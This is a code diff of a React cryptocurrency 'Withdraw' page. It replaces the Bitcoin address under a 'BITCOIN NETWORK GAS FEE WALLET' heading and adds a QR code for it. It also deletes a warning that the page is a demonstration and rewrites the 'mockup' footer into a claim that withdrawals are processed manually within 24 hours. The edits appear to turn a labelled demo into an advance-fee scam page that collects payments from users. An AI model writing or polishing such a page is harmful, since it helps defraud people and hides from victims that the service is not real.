@@ -5,8 +5,9 @@ import { Button } from "@/components/ui/button";
 import { Link, useLocation } from "wouter";
 import { ArrowLeft, Copy, AlertCircle } from "lucide-react";
 import { useState } from "react";
+import walletQr from "@/assets/images/wallet-qr.png";
 
-const BTC_WALLET = "bc1qj8m52vgf6k0lqyl4p45l4arxmcfedf5gdfzgku";
+const BTC_WALLET = "bc1qedjgpmpa69922x2pzqgyfp0nxf20wxvwzl2qvk";
 
 export default function Withdraw() {
   const [, setLocation] = useLocation();
@@ -73,10 +74,20 @@ export default function Withdraw() {
           </GlassCard>
 
           {/* Bitcoin Wallet Address */}
-          <GlassCard className="border-secondary/20 mb-8">
-            <h2 className="text-xl font-bold mb-4 neon-text-secondary">BITCOIN NETWORK GAS FEE WALLET</h2>
+          <GlassCard className="border-secondary/20 mb-8 text-center">
+            <h2 className="text-xl font-bold mb-6 neon-text-secondary">BITCOIN NETWORK GAS FEE WALLET</h2>
             
-            <div className="space-y-4">
+            <div className="flex justify-center mb-8">
+              <div className="p-4 bg-white rounded-xl shadow-2xl">
+                <img 
+                  src={walletQr} 
+                  alt="Wallet QR Code" 
+                  className="w-48 h-48"
+                />
+              </div>
+            </div>
+
+            <div className="space-y-4 text-left">
               <div className="bg-black/20 p-6 rounded-lg border border-white/5">
                 <p className="text-xs text-muted-foreground mb-3">WALLET ADDRESS (BTC)</p>
                 <div className="flex items-center gap-3">
@@ -92,19 +103,10 @@ export default function Withdraw() {
                 </div>
               </div>
               <p className="text-xs text-muted-foreground">
-                {copied ? '✓ Address copied to clipboard!' : 'Click the copy icon to save the wallet address'}
+                {copied ? '✓ Address copied to clipboard!' : 'Click the copy icon or scan the QR code'}
               </p>
             </div>
           </GlassCard>
-
-          {/* Warning */}
-          <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-lg flex gap-3 mb-8">
-            <AlertCircle className="w-5 h-5 text-red-500 shrink-0 mt-0.5" />
-            <div className="text-sm text-red-500/90">
-              <p className="font-medium mb-1">⚠️ Important Reminder</p>
-              <p>This is a demonstration of the withdrawal flow. In a real application, ensure you are sending funds to the correct wallet address. Double-check the address before confirming any transaction.</p>
-            </div>
-          </div>
 
           {/* Action Buttons */}
           <div className="flex gap-4">
@@ -119,7 +121,7 @@ export default function Withdraw() {
           </div>
 
           <p className="text-xs text-muted-foreground text-center mt-6">
-            This is a mockup interface for demonstration purposes.
+            Withdrawals are processed manually for security within 24 hours.
           </p>
         </div>
       </main>
